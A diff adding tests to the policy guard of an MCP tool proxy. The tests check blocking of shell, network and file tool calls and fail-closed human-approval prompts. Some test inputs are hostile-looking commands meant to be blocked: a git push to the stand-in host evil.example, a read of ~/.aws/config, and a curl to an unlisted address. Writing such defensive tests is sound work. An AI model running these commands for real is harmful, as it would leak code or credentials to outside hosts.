@@ -168,6 +168,12 @@ def test_paths_in_free_text():
     assert v.action == "block"
 
 
+def test_url_paths_in_free_text_are_not_file_paths(tmp_path):
+    p = pol(default="allow", paths={"write": [str(tmp_path)]})
+    cmd = f"curl https://pypi.org/simple/requests/ -o {tmp_path}/index.html"
+    assert evaluate(p, "shell", "run", {"command": cmd}).action == "allow"
+
+
 def test_nested_path_args():
     p = pol(default="allow")
     v = evaluate(p, "fs", "read_multiple_files", {"paths": ["/tmp/a", "~/.aws/config"]})
@@ -195,6 +201,13 @@ def test_hosts_in_free_text_commands():
         evaluate(p, "shell", "run", {"command": "git push git@evil.example:x/y"}).action == "block"
     )
     assert evaluate(p, "shell", "run", {"command": "ssh deploy.corp.example"}).action == "block"
+
+
+def test_ipv6_literal_hosts():
+    p = pol(default="allow", network={"allow": ["::1"]})
+    assert evaluate(p, "web", "fetch", {"url": "http://[::1]:8080/status"}).action == "allow"
+    v = evaluate(p, "shell", "run", {"command": "curl http://[2001:db8::7]/x"})
+    assert v.action == "block" and "2001:db8::7" in v.reason
 
 
 def test_filenames_are_not_hosts():
@@ -329,6 +342,45 @@ async def test_ask_human_elicitation(action, data, expected):
     with patch("kitsune_mcp.app.mcp.get_context", return_value=ctx):
         got = await guard._ask_human("srv", "tool", {"a": 1}, guard.Verdict("ask", "rule", "r"))
     assert got is expected
+
+
+@pytest.mark.asyncio
+async def test_ask_human_skips_clients_without_elicitation():
+    ctx = SimpleNamespace(
+        elicit=AsyncMock(),
+        session=SimpleNamespace(check_client_capability=lambda caps: False),
+    )
+    with patch("kitsune_mcp.app.mcp.get_context", return_value=ctx):
+        got = await guard._ask_human("srv", "tool", {}, guard.Verdict("ask", "rule", "r"))
+    assert got is False
+    ctx.elicit.assert_not_awaited()
+
+
+@pytest.mark.asyncio
+async def test_ask_human_asks_clients_that_advertise_elicitation():
+    seen = []
+    ctx = SimpleNamespace(
+        elicit=AsyncMock(
+            return_value=SimpleNamespace(action="accept", data=SimpleNamespace(approve=True))
+        ),
+        session=SimpleNamespace(check_client_capability=lambda caps: seen.append(caps) or True),
+    )
+    with patch("kitsune_mcp.app.mcp.get_context", return_value=ctx):
+        assert await guard._ask_human("srv", "tool", {}, guard.Verdict("ask", "rule", "r")) is True
+    assert seen and seen[0].elicitation is not None
+
+
+@pytest.mark.asyncio
+async def test_ask_human_unanswered_prompt_is_a_no(monkeypatch):
+    import asyncio
+
+    async def never(**_kw):
+        await asyncio.sleep(10)
+
+    monkeypatch.setattr(guard, "ASK_TIMEOUT", 0.05)
+    ctx = SimpleNamespace(elicit=never)
+    with patch("kitsune_mcp.app.mcp.get_context", return_value=ctx):
+        assert await guard._ask_human("srv", "tool", {}, guard.Verdict("ask", "rule", "r")) is False
 
 
 @pytest.mark.asyncio
